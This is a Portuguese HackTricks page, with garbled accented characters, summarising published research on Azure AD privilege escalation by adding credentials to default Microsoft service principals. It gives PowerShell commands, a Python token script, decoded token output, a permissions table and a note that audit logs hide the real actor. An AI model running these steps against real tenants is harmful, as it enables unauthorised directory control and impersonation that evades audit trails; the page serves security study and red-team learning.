# Az - Aplica√ß√µes Padr√£o

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Este √© um resumo da t√©cnica explicada em** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)**,** [**https://www.youtube.com/watch?v=JEIR5oGCwdg**](https://www.youtube.com/watch?v=JEIR5oGCwdg) e [**https://www.youtube.com/watch?v=xei8lAPitX8**](https://www.youtube.com/watch?v=xei8lAPitX8)

## Informa√ß√µes B√°sicas

Diferen√ßa entre uma aplica√ß√£o e um Service Principal no Azure:

* **Application/App Registrations**: S√£o aplica√ß√µes que existem no seu Azure AD
* `(Get-AzureADApplication -filter "DisplayName eq 'testapp'")`
* **Service Principal/Enterprise Applications**: Objetos de seguran√ßa no seu Azure AD que podem ter **privil√©gios** no Diret√≥rio Azure e est√£o vinculados a uma aplica√ß√£o sua ou de terceiros
* `Get-AzureADServicePrincipal -filter "DisplayName eq 'testapp'")`
* Um administrador pode precisar aprovar as permiss√µes concedidas se forem muito sens√≠veis.

Uma aplica√ß√£o pode estar operando em um **Tenant de terceiros** e, uma vez que voc√™ comece a us√°-la e dar acesso, um **Enterprise Application/Service Principal √© criado no seu tenant** para dar acesso √†s informa√ß√µes necess√°rias:

<figure><img src="../../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Aplica√ß√µes tamb√©m t√™m 2 tipos de privil√©gios que s√£o atribu√≠dos ao service principal da aplica√ß√£o:

* **Delegated permissions**: Que requerem um usu√°rio autenticado presente para serem usados
* **Application permissions**: Que s√£o atribu√≠dos √† aplica√ß√£o e podem ser usados a qualquer momento

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Al√©m disso, o **portal Azure** chama Service Principals de **"Enterprise Applications"** e **oculta** a maioria das **propriedades** dos service principals da visualiza√ß√£o.

Para o Office 365 e outras **aplica√ß√µes da Microsoft**, a **defini√ß√£o da Aplica√ß√£o** est√° presente em um dos **diret√≥rios Azure dedicados** da Microsoft.

{% hint style="danger" %}
Em um tenant do Office 365, service principals s√£o criados automaticamente para essas aplica√ß√µes, dando a um Azure AD do Office 365 cerca de 200 service principals por padr√£o que todos t√™m diferentes permiss√µes pr√©-atribu√≠das.
{% endhint %}

## Obtendo acesso √†s Aplica√ß√µes da Microsoft

Um **Administrador de Aplica√ß√µes** (ou a **conta de Sincroniza√ß√£o On-premise** se voc√™ estiver escalando de on-premise para a nuvem) pode **atribuir credenciais a uma aplica√ß√£o**, ap√≥s o qual esta aplica√ß√£o pode fazer login usando o fluxo OAuth2 de **client credential grant**. Atribuir credenciais √© poss√≠vel usando PowerShell:
```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```
Ent√£o, voc√™ pode fazer login e dar uma olhada no token de acesso emitido. Este **JWT exibe os pap√©is que o aplicativo tem no Microsoft Graph**:
```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
'resource':'https://graph.microsoft.com',
'client_secret':'redactedpassword',
'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
jwtdata = jwt.decode(data2['access_token'], verify=False)
pprint.pprint(jwtdata)
except KeyError:
pass
```
Isso imprimir√° os dados do token, contendo o campo "Roles":

<pre class="language-json"><code class="lang-json">{
"aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
"app_displayname": "Microsoft StaffHub",
"appid": "aa580612-c342-4ace-9055-8edee43ccb89",
"appidacr": "1",
"aud": "https://graph.microsoft.com",
"exp": 1567200473,
"iat": 1567171373,
"idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"nbf": 1567171373,
"oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
"tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
"uti": "2GScBJopwk2e3EFce7pgAA",
"ver": "1.0",
"xms_tcdt": 1559139940
}
</code></pre>

Este m√©todo pareceu funcionar apenas para o **Microsoft Graph** (e n√£o para o Azure AD graph). N√£o tenho certeza se isso ocorre porque nenhum aplicativo tem permiss√µes no Azure AD graph ou se o sistema usado para essas permiss√µes √© diferente.

Se realizarmos essa a√ß√£o para todos os ~200 aplicativos padr√£o em um tenant do Office 365, obteremos uma vis√£o geral de todas as **permiss√µes que esses aplicativos t√™m**. Abaixo est√° uma vis√£o geral das permiss√µes mais interessantes que identifiquei.

| Nome do Aplicativo                     | AppId                                | Acesso                              |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## Resumo do Ataque

Ent√£o, o resumo √© que se voc√™ comprometer uma conta de **Administrador de Aplicativos** ou a **conta de Sincroniza√ß√£o local**, voc√™ pode ler e **modificar configura√ß√µes de diret√≥rio, membros de grupos, contas de usu√°rios, sites do SharePoint e arquivos do OneDrive**. Isso √© feito **atribuindo credenciais a um principal de servi√ßo existente** com essas permiss√µes e depois se passando por esses aplicativos.

Voc√™ pode explorar isso **atribuindo uma senha ou** [**certificado**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **a um principal de servi√ßo** e depois fazendo login como esse principal de servi√ßo. Eu uso Python para fazer login com uma senha de principal de servi√ßo, j√° que o m√≥dulo PowerShell n√£o suporta isso (ele suporta certificados, mas isso √© mais complexo de configurar).

O comando abaixo mostra que, ao fazer login com tal certificado, temos o poder de modificar membros de grupos (algo que o administrador de aplicativos normalmente n√£o tem):
```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```
No log de auditoria do Azure AD, as a√ß√µes s√£o mostradas como realizadas pelo "Microsoft StaffHub", e assim nada no log indica que essas a√ß√µes foram de fato realizadas pelo administrador do aplicativo.

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
